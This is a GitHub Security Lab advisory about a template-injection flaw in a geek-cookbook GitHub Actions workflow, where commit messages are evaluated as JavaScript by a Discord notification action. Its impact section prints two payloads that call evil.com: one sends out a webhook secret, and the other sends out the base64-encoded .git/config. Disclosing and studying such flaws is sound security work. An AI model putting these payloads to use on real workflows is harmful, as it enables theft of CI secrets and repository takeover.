md-10">
    <header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">March 25, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-323: Template injection in a GitHub workflow of geek-cookbook</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2020-12-04: Issue reported to maintainers</li>
  <li>2021-01-22: Report receipt acknowledged</li>
  <li>2021-01-23: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/geek-cookbook/geek-cookbook/blob/master/.github/workflows/on-push-master-notify-discord.yml">‘on-push-master-notify-discord.yml’ GitHub workflow</a> is vulnerable to template injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/geek-cookbook/geek-cookbook">geek-cookbook/geek-cookbook GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset to the date <a href="https://github.com/geek-cookbook/geek-cookbook/blob/769313371db2f84abc7a088e306e9595607eaa49/.github/workflows/on-push-master-notify-discord.yml">7693133</a>.</p>

<h2 id="details">Details</h2>

<h3 id="issue-a-commit-comment-is-used-to-format-a-discord-message">Issue: A commit comment is used to format a Discord message</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">push</span><span class="pi">:</span>
<span class="nn">...</span>
    <span class="na">steps</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Discord notification</span>
      <span class="na">env</span><span class="pi">:</span>
        <span class="na">DISCORD_WEBHOOK</span><span class="pi">:</span> <span class="s">${{ secrets.DISCORD_WEBHOOK }}</span>
      <span class="na">uses</span><span class="pi">:</span> <span class="s">Ilshidur/action-discord@master</span>
      <span class="na">with</span><span class="pi">:</span>
        <span class="na">args</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">Greetings, geeks!  🤓</span>
          <span class="s">The [Geek's Cookbook](https://geek-cookbook.funkypenguin.co.nz) has been updated!</span>
          <span class="s">Here's what's fresh:</span>
          <span class="s">:cupcake: [${{github.event.commits[0].message}}]({{ EVENT_PAYLOAD.compare }})</span>
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">${{github.event.commits[0].message}}</code>, used here, allows for injection of arbitrary markdown into the Discord message. However this is not all.</p>

<p>The Discord action supports interpolation syntax for environment variables. There are examples of intended usage in the documentation such as <code class="language-plaintext highlighter-rouge">The project {{ EVENT_PAYLOAD.repository.full_name }} has been deployed</code>. The interpolation is implemented in a way that the expressions may be interpreted as javascript:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">_</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">_</span><span class="p">.</span><span class="nx">template</span><span class="p">(</span><span class="nx">args</span><span class="p">)({</span> <span class="p">...</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">,</span> <span class="na">EVENT_PAYLOAD</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">eventContent</span><span class="p">)</span> <span class="p">});</span>
</code></pre></div></div>

<p>An attacker may create a specially crafted commit description and make a valid pull request, that will get merged. It is likely that the reviewer will not notice it, especially if there are multiple commits in the PR.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of a GitHub runner. The following payload would exfiltrate the secret DISCORD_WEBHOOK to an attacker-controlled server. This would give the attacker full control over the Discord message hook.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="s2">`http://evil.com?t=</span><span class="p">${</span><span class="nx">DISCORD_WEBHOOK</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>While the workflow is using only one secret, the injection may get much more severe if the workflow gets more complex. For example, if a checkout action is used without <code class="language-plaintext highlighter-rouge">persist-credentials</code> set to <code class="language-plaintext highlighter-rouge">false</code> an attacker could get write access to the repository with the payload below:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://evil.com?t=</span><span class="dl">'</span><span class="o">+</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./.git/config</span><span class="dl">'</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">))</span> <span class="p">}}</span>
</code></pre></div></div>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-323</code> in any communication regarding th